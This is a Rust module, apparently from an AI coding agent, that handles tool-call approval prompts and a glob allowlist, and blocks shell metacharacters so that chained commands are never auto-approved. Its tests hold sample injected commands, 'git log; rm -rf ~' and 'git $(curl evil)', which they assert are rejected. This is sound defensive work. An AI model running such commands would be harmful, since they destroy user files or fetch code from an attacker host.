//! Approval prompts and the persistent allowlist (spec §8.2).

use async_trait::async_trait;
use serde::{Deserialize, Serialize};

use crate::types::ToolCall;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    AllowOnce,
    /// Allow, and remember `pattern` for this tool.
    AlwaysAllow,
    Deny,
}

/// Journaled output of an `approval` step.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalOutcome {
    Approved,
    Denied,
    Timeout,
}

#[derive(Debug, Clone)]
pub struct ApprovalRequest {
    pub call: ToolCall,
    /// One-line description of what the call does.
    pub summary: String,
    /// What "always allow" would add to the allowlist.
    pub pattern: String,
}

#[async_trait]
pub trait ApprovalHandler: Send + Sync {
    async fn ask(&self, req: &ApprovalRequest) -> Decision;
}

/// Approves everything (`--yes`).
pub struct AutoApprove;

#[async_trait]
impl ApprovalHandler for AutoApprove {
    async fn ask(&self, _req: &ApprovalRequest) -> Decision {
        Decision::AllowOnce
    }
}

/// Denies everything (non-interactive runs without `--yes`).
pub struct AutoDeny;

#[async_trait]
impl ApprovalHandler for AutoDeny {
    async fn ask(&self, _req: &ApprovalRequest) -> Decision {
        Decision::Deny
    }
}

/// The string allowlist patterns are matched against.
pub fn subject(call: &ToolCall) -> String {
    if call.name == "shell" {
        call.input["command"]
            .as_str()
            .unwrap_or_default()
            .trim()
            .to_owned()
    } else {
        String::new()
    }
}

/// Pattern "always allow" records: for `shell`, the first word plus ` *`.
pub fn pattern_for(call: &ToolCall) -> String {
    let subject = subject(call);
    match subject.split_whitespace().next() {
        Some(first) if call.name == "shell" => format!("{first} *"),
        _ => "*".to_owned(),
    }
}

/// Characters that let one shell command run another. A command containing
/// any of these is never auto-approved by a pattern like `git *`.
const SHELL_META: &[char] = &[';', '|', '&', '`', '$', '>', '<', '\n', '(', ')'];

pub fn allowed_by(patterns: &[String], call: &ToolCall) -> bool {
    let subject = subject(call);
    if call.name == "shell" && subject.contains(SHELL_META) {
        return false;
    }
    patterns.iter().any(|p| {
        glob_match(p, &subject)
            // `git *` also covers bare `git`.
            || p.strip_suffix(" *").is_some_and(|prefix| prefix == subject)
    })
}

/// `*` matches any run of characters; everything else is literal.
pub fn glob_match(pattern: &str, s: &str) -> bool {
    let parts: Vec<&str> = pattern.split('*').collect();
    let [first, middle @ .., last] = parts.as_slice() else {
        return pattern == s;
    };
    let Some(mut rest) = s.strip_prefix(first) else {
        return false;
    };
    for part in middle {
        match rest.find(part) {
            Some(i) => rest = &rest[i + part.len()..],
            None => return false,
        }
    }
    rest.len() >= last.len() && rest.ends_with(last)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn shell(cmd: &str) -> ToolCall {
        ToolCall {
            id: "1".into(),
            name: "shell".into(),
            input: json!({ "command": cmd }),
        }
    }

    #[test]
    fn globbing() {
        assert!(glob_match("git *", "git status"));
        assert!(glob_match("*", ""));
        assert!(glob_match("a*b*c", "axxbyyc"));
        assert!(!glob_match("a*b", "ab c"));
        assert!(!glob_match("ls *", "lsof -i"));
        assert!(glob_match("exact", "exact"));
    }

    #[test]
    fn shell_patterns() {
        assert_eq!(pattern_for(&shell("  git status --short")), "git *");
        let pats = vec!["git *".to_owned()];
        assert!(allowed_by(&pats, &shell("git log")));
        assert!(allowed_by(&pats, &shell("git")));
        assert!(!allowed_by(&pats, &shell("gitk")));
        assert!(!allowed_by(&pats, &shell("git log; rm -rf ~")));
        assert!(!allowed_by(&pats, &shell("git $(curl evil)")));
    }

    #[test]
    fn non_shell_tools_allow_all_with_star() {
        let call = ToolCall {
            id: "1".into(),
            name: "write_file".into(),
            input: json!({}),
        };
        assert_eq!(pattern_for(&call), "*");
        assert!(allowed_by(&["*".to_owned()], &call));
        assert!(!allowed_by(&[], &call));
    }
}
